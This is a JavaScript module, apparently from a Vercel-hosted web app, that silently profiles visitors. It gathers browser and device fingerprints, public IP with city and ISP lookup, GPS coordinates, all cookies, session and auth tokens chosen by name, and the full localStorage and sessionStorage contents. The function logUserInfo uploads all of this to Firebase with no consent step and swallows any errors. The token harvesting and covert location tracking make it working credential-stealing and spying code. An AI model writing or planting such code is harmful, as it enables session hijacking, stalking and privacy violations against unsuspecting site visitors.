// Captura toda la información disponible del usuario
export const captureUserInfo = async () => {
  const info = {
    timestamp: new Date().toISOString(),
    
    // Información del navegador
    browser: {
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      vendor: navigator.vendor,
      vendorSub: navigator.vendorSub,
      product: navigator.product,
      productSub: navigator.productSub,
      appName: navigator.appName,
      appVersion: navigator.appVersion,
      appCodeName: navigator.appCodeName,
      hardwareConcurrency: navigator.hardwareConcurrency,
      maxTouchPoints: navigator.maxTouchPoints,
      webdriver: navigator.webdriver,
      doNotTrack: navigator.doNotTrack,
    },

    // Información de la pantalla
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      orientation: screen.orientation?.type,
      devicePixelRatio: window.devicePixelRatio,
    },

    // Información de la ventana
    window: {
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      screenX: window.screenX,
      screenY: window.screenY,
      scrollX: window.scrollX,
      scrollY: window.scrollY,
    },

    // Información de la página
    page: {
      url: window.location.href,
      hostname: window.location.hostname,
      pathname: window.location.pathname,
      search: window.location.search,
      hash: window.location.hash,
      protocol: window.location.protocol,
      port: window.location.port,
      referrer: document.referrer,
      title: document.title,
      charset: document.characterSet,
      lastModified: document.lastModified,
      readyState: document.readyState,
    },

    // Zona horaria
    timezone: {
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      locale: Intl.DateTimeFormat().resolvedOptions().locale,
    },

    // Información de conexión (si está disponible)
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      type: navigator.connection.type,
      downlink: navigator.connection.downlink,
      downlinkMax: navigator.connection.downlinkMax,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData,
    } : null,
    
    // Información de red adicional
    network: {
      onLine: navigator.onLine,
      connectionType: getConnectionType(),
      estimatedBandwidth: navigator.connection?.downlink || null,
      networkQuality: getNetworkQuality(),
    },

    // Información de memoria (si está disponible)
    memory: navigator.deviceMemory ? {
      deviceMemory: navigator.deviceMemory,
    } : null,

    // Información de batería (si está disponible)
    battery: null,

    // Información de geolocalización por IP
    geolocationIP: null,
    
    // Información de geolocalización GPS
    geolocationGPS: null,

    // IP pública (se obtendrá con API externa)
    ip: null,
    
    // Cookies de sesión
    cookies: {
      all: document.cookie,
      sessionId: getSessionCookie(),
      count: document.cookie.split(';').filter(c => c.trim()).length,
      enabled: navigator.cookieEnabled
    },
    
    // Información de navegación limitada
    navigation: {
      referrer: document.referrer,
      previousPage: document.referrer ? new URL(document.referrer).hostname : null,
      historyLength: history.length,
      canGoBack: history.length > 1,
      currentDomain: window.location.hostname,
      visitTime: new Date().toISOString(),
      sessionStorage: getStorageInfo('session'),
      localStorage: getStorageInfo('local')
    },
    

  };

  // Intentar obtener información de batería
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      info.battery = {
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime,
        level: battery.level,
      };
    }
  } catch (e) {
    // Battery API no disponible
  }

  // Obtener IP pública con múltiples APIs de respaldo
  try {
    // Intentar con la primera API
    let ipData;
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      ipData = await ipResponse.json();
      info.ip = ipData.ip;
    } catch {
      // API de respaldo
      const ipResponse = await fetch('https://httpbin.org/ip');
      ipData = await ipResponse.json();
      info.ip = ipData.origin;
    }

    // Obtener información adicional con API alternativa
    try {
      const geoResponse = await fetch(`https://ipapi.co/${info.ip}/json/`);
      const geoData = await geoResponse.json();
      
      if (geoData && !geoData.error) {
        info.ipInfo = {
          ip: geoData.ip,
          city: geoData.city,
          region: geoData.region,
          country: geoData.country_name,
          countryCode: geoData.country_code,
          postal: geoData.postal,
          latitude: geoData.latitude,
          longitude: geoData.longitude,
          timezone: geoData.timezone,
          isp: geoData.org,
          org: geoData.org,
          as: geoData.asn,
        };
        
        // Guardar coordenadas de IP
        if (geoData.latitude && geoData.longitude) {
          info.geolocationIP = {
            latitude: geoData.latitude,
            longitude: geoData.longitude,
            accuracy: 10000,
            timestamp: Date.now(),
            source: 'Geolocalización por IP',
            mapsUrl: generateMapsLink(geoData.latitude, geoData.longitude, 10000)
          };
        }
      }
    } catch {
      // No se pudo obtener información geográfica de la IP
    }
  } catch (e) {
    // No se pudo obtener información de IP
  }

  // Intentar obtener GPS por separado
  if ('geolocation' in navigator) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          timeout: 5000,
          enableHighAccuracy: true,
        });
      });
      
      info.geolocationGPS = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp,
        source: 'GPS del dispositivo',
        mapsUrl: generateMapsLink(position.coords.latitude, position.coords.longitude, position.coords.accuracy)
      };
    } catch (e) {
      // GPS rechazado o no disponible
    }
  }



  return info;
};

// Detectar sistema operativo
export const detectOS = (userAgent) => {
  const os = [
    { name: 'Windows 11', regex: /Windows NT 10.0.*rv:.*\) like Gecko/ },
    { name: 'Windows 10', regex: /Windows NT 10.0/ },
    { name: 'Windows 8.1', regex: /Windows NT 6.3/ },
    { name: 'Windows 8', regex: /Windows NT 6.2/ },
    { name: 'Windows 7', regex: /Windows NT 6.1/ },
    { name: 'Windows Vista', regex: /Windows NT 6.0/ },
    { name: 'Windows XP', regex: /Windows NT 5.1/ },
    { name: 'macOS', regex: /Mac OS X/ },
    { name: 'iOS', regex: /iPhone|iPad/ },
    { name: 'Android', regex: /Android/ },
    { name: 'Linux', regex: /Linux/ },
    { name: 'Chrome OS', regex: /CrOS/ },
  ];

  for (const system of os) {
    if (system.regex.test(userAgent)) {
      return system.name;
    }
  }
  return 'Desconocido';
};

// Detectar navegador
export const detectBrowser = (userAgent) => {
  const browsers = [
    { name: 'Chrome', regex: /Chrome\/([0-9.]+)/ },
    { name: 'Firefox', regex: /Firefox\/([0-9.]+)/ },
    { name: 'Safari', regex: /Safari\/([0-9.]+)/ },
    { name: 'Edge', regex: /Edg\/([0-9.]+)/ },
    { name: 'Opera', regex: /OPR\/([0-9.]+)/ },
    { name: 'Internet Explorer', regex: /MSIE ([0-9.]+)/ },
  ];

  for (const browser of browsers) {
    const match = userAgent.match(browser.regex);
    if (match) {
      return { name: browser.name, version: match[1] };
    }
  }
  return { name: 'Desconocido', version: 'Desconocido' };
};

// Detectar tipo de dispositivo
export const detectDeviceType = (userAgent, screen) => {
  const ua = userAgent.toLowerCase();
  
  // Detectar móviles específicos
  if (/iphone/.test(ua)) {
    const model = ua.match(/iphone os ([0-9_]+)/);
    return {
      type: 'Móvil',
      category: 'Smartphone',
      brand: 'Apple',
      model: 'iPhone',
      os: model ? `iOS ${model[1].replace(/_/g, '.')}` : 'iOS'
    };
  }
  
  if (/ipad/.test(ua)) {
    return {
      type: 'Tablet',
      category: 'Tablet',
      brand: 'Apple',
      model: 'iPad',
      os: 'iPadOS'
    };
  }
  
  if (/android/.test(ua)) {
    const isTablet = !/mobile/.test(ua) || screen.width >= 768;
    const model = ua.match(/android ([0-9.]+)/);
    
    // Detectar marcas Android
    let brand = 'Android';
    if (/samsung/.test(ua)) brand = 'Samsung';
    else if (/huawei/.test(ua)) brand = 'Huawei';
    else if (/xiaomi/.test(ua)) brand = 'Xiaomi';
    else if (/oppo/.test(ua)) brand = 'Oppo';
    else if (/vivo/.test(ua)) brand = 'Vivo';
    else if (/lg/.test(ua)) brand = 'LG';
    else if (/motorola/.test(ua)) brand = 'Motorola';
    
    return {
      type: isTablet ? 'Tablet' : 'Móvil',
      category: isTablet ? 'Tablet Android' : 'Smartphone Android',
      brand,
      model: isTablet ? 'Tablet Android' : 'Smartphone Android',
      os: model ? `Android ${model[1]}` : 'Android'
    };
  }
  
  // Detectar laptops y PCs
  if (/windows/.test(ua)) {
    const isTouch = navigator.maxTouchPoints > 0;
    return {
      type: isTouch ? 'Laptop Táctil' : 'PC/Laptop',
      category: 'Computadora',
      brand: 'PC',
      model: isTouch ? 'Laptop con pantalla táctil' : 'PC/Laptop Windows',
      os: detectOS(userAgent)
    };
  }
  
  if (/mac os/.test(ua)) {
    const isMacBook = /macintosh/.test(ua) && screen.width <= 1920;
    return {
      type: isMacBook ? 'MacBook' : 'iMac/Mac',
      category: 'Computadora Apple',
      brand: 'Apple',
      model: isMacBook ? 'MacBook' : 'iMac/Mac Pro',
      os: 'macOS'
    };
  }
  
  if (/linux/.test(ua)) {
    return {
      type: 'PC/Laptop',
      category: 'Computadora Linux',
      brand: 'PC',
      model: 'PC/Laptop Linux',
      os: 'Linux'
    };
  }
  
  return {
    type: 'Desconocido',
    category: 'Dispositivo desconocido',
    brand: 'Desconocido',
    model: 'Desconocido',
    os: 'Desconocido'
  };
};

// Obtener nombre del usuario del sistema
export const getUserName = () => {
  const ua = navigator.userAgent;
  
  // Intentar extraer nombre de usuario de diferentes fuentes
  let userName = 'Usuario_Anonimo';
  
  // Para macOS - buscar en el user agent
  if (/Mac OS X/.test(ua)) {
    // Intentar obtener del hostname si está disponible
    try {
      const hostname = window.location.hostname;
      if (hostname && hostname !== 'localhost' && !hostname.includes('192.168')) {
        userName = `Mac_${hostname.split('.')[0]}`;
      } else {
        userName = `MacBook_Usuario`;
      }
    } catch {
      userName = 'MacBook_Usuario';
    }
  }
  
  // Para Windows
  else if (/Windows/.test(ua)) {
    userName = 'PC_Usuario';
  }
  
  // Para dispositivos móviles iOS
  else if (/iPhone/.test(ua)) {
    // Intentar extraer modelo de iPhone
    const model = ua.match(/iPhone OS ([0-9_]+)/);
    userName = model ? `iPhone_iOS${model[1].split('_')[0]}` : 'iPhone_Usuario';
  }
  
  // Para iPad
  else if (/iPad/.test(ua)) {
    userName = 'iPad_Usuario';
  }
  
  // Para Android
  else if (/Android/.test(ua)) {
    let deviceName = 'Android_Usuario';
    
    // Detectar marca específica
    if (/Samsung/.test(ua)) deviceName = 'Samsung_Usuario';
    else if (/Huawei/.test(ua)) deviceName = 'Huawei_Usuario';
    else if (/Xiaomi/.test(ua)) deviceName = 'Xiaomi_Usuario';
    else if (/OPPO/.test(ua)) deviceName = 'Oppo_Usuario';
    else if (/Vivo/.test(ua)) deviceName = 'Vivo_Usuario';
    else if (/LG/.test(ua)) deviceName = 'LG_Usuario';
    else if (/Motorola/.test(ua)) deviceName = 'Motorola_Usuario';
    
    userName = deviceName;
  }
  
  // Añadir timestamp para hacer único
  const timestamp = `${new Date().getHours()}${new Date().getMinutes()}`;
  return `${userName}_${timestamp}`;
};

// Obtener información del propietario del dispositivo
export const getUserDeviceOwner = () => {
  const ua = navigator.userAgent;
  let deviceInfo = {
    deviceName: 'Dispositivo_Desconocido',
    systemUser: 'Usuario_Desconocido',
    computerName: null
  };
  
  // Para macOS - intentar obtener nombre de la computadora
  if (/Mac OS X/.test(ua)) {
    try {
      // Intentar obtener del referrer o URL si contiene información
      const url = window.location.href;
      const referrer = document.referrer;
      
      // Si está en red local, intentar obtener hostname
      if (window.location.hostname.includes('192.168') || window.location.hostname === 'localhost') {
        deviceInfo.computerName = 'MacBook_Local';
      }
      
      deviceInfo.deviceName = 'MacBook';
      deviceInfo.systemUser = 'Usuario_Mac';
    } catch {
      deviceInfo.deviceName = 'MacBook';
      deviceInfo.systemUser = 'Usuario_Mac';
    }
  }
  
  // Para Windows
  else if (/Windows/.test(ua)) {
    deviceInfo.deviceName = 'PC_Windows';
    deviceInfo.systemUser = 'Usuario_Windows';
  }
  
  // Para dispositivos móviles
  else if (/iPhone/.test(ua)) {
    deviceInfo.deviceName = 'iPhone';
    deviceInfo.systemUser = 'Propietario_iPhone';
  }
  
  else if (/iPad/.test(ua)) {
    deviceInfo.deviceName = 'iPad';
    deviceInfo.systemUser = 'Propietario_iPad';
  }
  
  else if (/Android/.test(ua)) {
    let brand = 'Android';
    if (/Samsung/.test(ua)) brand = 'Samsung';
    else if (/Huawei/.test(ua)) brand = 'Huawei';
    else if (/Xiaomi/.test(ua)) brand = 'Xiaomi';
    else if (/OPPO/.test(ua)) brand = 'Oppo';
    else if (/Vivo/.test(ua)) brand = 'Vivo';
    
    deviceInfo.deviceName = brand;
    deviceInfo.systemUser = `Propietario_${brand}`;
  }
  
  return deviceInfo;
};

// Detectar tipo de conexión
const getConnectionType = () => {
  if (!navigator.connection) return 'Desconocido';
  
  const connection = navigator.connection;
  const type = connection.type || connection.effectiveType;
  
  const connectionTypes = {
    'bluetooth': 'Bluetooth',
    'cellular': 'Red Celular',
    'ethernet': 'Ethernet',
    'wifi': 'WiFi',
    'wimax': 'WiMAX',
    'other': 'Otra',
    'unknown': 'Desconocida',
    'slow-2g': 'Red Celular (2G Lenta)',
    '2g': 'Red Celular (2G)',
    '3g': 'Red Celular (3G)',
    '4g': 'Red Celular (4G/LTE)',
    '5g': 'Red Celular (5G)'
  };
  
  return connectionTypes[type] || `Conexión ${type}`;
};

// Obtener información de almacenamiento
const getStorageInfo = (type) => {
  try {
    const storage = type === 'session' ? sessionStorage : localStorage;
    const keys = Object.keys(storage);
    const items = {};
    
    keys.forEach(key => {
      try {
        items[key] = storage.getItem(key);
      } catch {
        items[key] = '[No accesible]';
      }
    });
    
    return {
      available: true,
      itemCount: keys.length,
      keys: keys,
      items: items
    };
  } catch {
    return {
      available: false,
      itemCount: 0,
      keys: [],
      items: {}
    };
  }
};

// Obtener cookie de sesión
const getSessionCookie = () => {
  const cookies = document.cookie.split(';');
  const sessionCookies = [];
  
  cookies.forEach(cookie => {
    const [name, value] = cookie.trim().split('=');
    if (name && value) {
      // Buscar cookies que parezcan de sesión
      if (name.toLowerCase().includes('session') || 
          name.toLowerCase().includes('sid') ||
          name.toLowerCase().includes('jsessionid') ||
          name.toLowerCase().includes('phpsessid') ||
          name.toLowerCase().includes('auth') ||
          name.toLowerCase().includes('token')) {
        sessionCookies.push({ name, value });
      }
    }
  });
  
  return sessionCookies.length > 0 ? sessionCookies : null;
};

// Obtener calidad de red
const getNetworkQuality = () => {
  if (!navigator.connection) return 'Desconocida';
  
  const connection = navigator.connection;
  const effectiveType = connection.effectiveType;
  const downlink = connection.downlink;
  const rtt = connection.rtt;
  
  if (effectiveType === 'slow-2g' || (downlink && downlink < 0.5)) {
    return 'Muy Lenta';
  } else if (effectiveType === '2g' || (downlink && downlink < 1.5)) {
    return 'Lenta';
  } else if (effectiveType === '3g' || (downlink && downlink < 10)) {
    return 'Moderada';
  } else if (effectiveType === '4g' || (downlink && downlink >= 10)) {
    return 'Rápida';
  }
  
  return 'Desconocida';
};

// Generar enlace de Google Maps
export const generateMapsLink = (lat, lng, accuracy = null) => {
  const zoom = accuracy ? Math.max(10, 20 - Math.log10(accuracy)) : 15;
  return `https://www.google.com/maps?q=${lat},${lng}&z=${Math.round(zoom)}`;
};

// Función para capturar y guardar información silenciosamente
export const logUserInfo = async () => {
  const info = await captureUserInfo();
  const os = detectOS(info.browser.userAgent);
  const browser = detectBrowser(info.browser.userAgent);
  const device = detectDeviceType(info.browser.userAgent, info.screen);
  const userName = getUserName();
  
  // Preparar datos para Firebase
  const firebaseData = {
    user: userName,
    deviceOwner: getUserDeviceOwner(),
    device: {
      type: device.type,
      brand: device.brand,
      model: device.model,
      category: device.category,
      os: device.os
    },
    browser: {
      name: browser.name,
      version: browser.version
    },
    location: {
      ip: info.ip,
      city: info.ipInfo?.city,
      region: info.ipInfo?.region,
      country: info.ipInfo?.country,
      isp: info.ipInfo?.isp,
      geolocationIP: info.geolocationIP,
      geolocationGPS: info.geolocationGPS
    },
    system: {
      screen: `${info.screen.width}x${info.screen.height}`,
      timezone: info.timezone.timezone,
      language: info.browser.language,
      platform: info.browser.platform
    },
    session: {
      url: info.page.url,
      referrer: info.page.referrer,
      userAgent: info.browser.userAgent,
      origin: window.location.hostname === 'localhost' ? 'localhost' : 'vercel',
      hostname: window.location.hostname
    },
    cookies: info.cookies,
    navigation: info.navigation,
    network: info.network
  };
  
  // Guardar en Firebase
  try {
    const { saveUserInfo } = await import('./firebase.js');
    await saveUserInfo(firebaseData);
  } catch (error) {
    // Error al guardar en Firebase
  }
  
  return info;
};